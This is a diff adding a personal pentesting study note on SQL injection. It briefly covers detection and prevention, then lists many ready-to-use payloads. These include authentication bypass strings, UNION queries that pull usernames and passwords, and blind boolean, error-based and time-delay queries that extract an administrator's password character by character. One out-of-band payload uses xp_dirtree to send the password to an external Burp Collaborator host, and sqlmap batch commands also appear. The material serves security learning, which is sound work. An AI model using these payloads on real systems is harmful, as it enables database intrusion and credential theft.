@@ -1,1 +1,129 @@
+An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input
 
+SQL injection is a vulnerability which allows an attacker to modify queries that an application makes to its database via user input. This could be abused to view, modify, or delete application data which wasn't previously possible, or causing persistent changes to the application's content or behaviour.
+
+![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6142dd6c-6f17-4c01-8766-1ca7b8fa2cde/Untitled.png)
+
+An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input.
+
+SQL injection is a vulnerability which allows an attacker to modify queries that an application makes to its database via user input. This could be abused to view, modify, or delete application data which wasn't previously possible, or causing persistent changes to the application's content or behaviour.
+
+[cheat sheet](https://www.notion.so/cheat-sheet-9d9739ce5da1456488c5d8f0f55cbc25)
+
+**Detection**
+- Submitting the single quote character ' and looking for errors
+- Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses
+- Submitting Boolean conditions such as OR 1=1 and OR 1=2
+- Submitting payloads designed to trigger time delays
+- Submitting OAST payloads designed to trigger an out-of-band network interaction
+
+**Prevention**
+Primary Defences:
+Option 1: Use of Prepared Statements (with Parameterized Queries)
+Option 2: Use of Stored Procedures
+Option 3: Allow-list Input Validation
+Option 4: Escaping All User Supplied Input
+
+Additional Defences:
+Also: Enforcing Least Privilege
+Also: Performing Allow-list Input Validation as a Secondary Defence
+
+**SleuthQL**
+[https://github.com/RhinoSecurityLabs/SleuthQL](https://github.com/RhinoSecurityLabs/SleuthQL)
+Save Burp crawled URLs as XML.
+/sleuth.py -d domain -f file.xml
+find . -name “*.txt” -exec sqlmap --batch -r {} --dbms mysql ;
+
+**Reference**
+https://portswigger.net/web-security/sql-injection/cheat-sheet https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/
+https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/
+http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
+https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection
+https://www.websec.ca/kb/sql_injection
+
+**First Order**
+Simple Auth bypass —> `admin' or '1'='1`
+Auth bypass with comments —> `admin'--`
+
+**Retrieving Hidden Data**
+Gifts'+OR+1=1-- --> SELECT * FROM products WHERE category = 
+'Gifts' OR 1=1--' AND released = 1
+
+**Detect number of columns** 
+- Using `ORDER BY`  —> `' order by 1-- -`  or `' order by 2-- -`
+- Using `UNION` —> `' UNION select 1,2,3-- -`
+
+**Retrieving data from other database tables**
+If results of an SQL query are returned within the application's responses, can leverage an SQL injection vulnerability to retrieve data from other tables within the database. This is done using the UNION keyword.
+
+```sql
+' UNION SELECT username, password FROM users--
+```
+
+**Examining the database**
+```sql
+SELECT * FROM v$version SELECT * FROM information_schema.tables
+```
+
+**Querying the database type and version**
+**Database type Query**
+Microsoft, MySQL —> SELECT @@version
+Oracle —> SELECT * FROM v$version
+PostgreSQL —> SELECT version()
+
+**Listing the contents of the database**
+Non-Oracle --> 
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users' 
+```
+Oracle --> 
+```sql
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+```
+
+**Blind SQLi**
+application does not return the results of the SQL query or the details of any database errors within its responses
+…xyz' AND '1'='1 --> true so get success response
+…xyz' AND '1'='2 --> false
+
+**Exploiting blind SQL injection by triggering conditional responses**
+TrackingId=xyz' AND '1'='1 -->run so vuln exist
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a --> confirming that there is a table called users
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='admin')='a -->confirming that there is a user called admin
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='admin' AND LENGTH(password)>1)='a --> password is greater than 1 character in length
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='admin')='a(The SUBSTRING() function extracts some characters from a string. SUBSTRING(string, start, length))
+
+**Blind SQL injection with conditional errors**
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+**Blind SQL injection with time delays and information retrieval**
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+**Blind SQL injection with out-of-band data exfiltration**
+application continues processing the user's request in the original thread, and uses another thread to execute an SQL query'
+; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+
+**Union Based SQLi**
+results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database
+
+For a UNION query to work, two key requirements must be met:
+- The individual queries must return the same number of columns.
+- The data types in each column must be compatible between the individual queries.
+
+**Determining the number of columns required**
+' ORDER BY 3--' UNION SELECT NULL,NULL,NULL--
+
+**Finding columns with a useful data type**
+' UNION SELECT 'a',NULL,NULL,NULL--
+
+**Retrieve interesting data**
+'+UNION+SELECT+username,+password+FROM+users--
+
+**Retrieving multiple values within a single column**
+' UNION SELECT username || '~' || password FROM users--
+
+**Second Order SQLi**
+application takes user input from an HTTP request and stores it for future use and used insecurely in another query
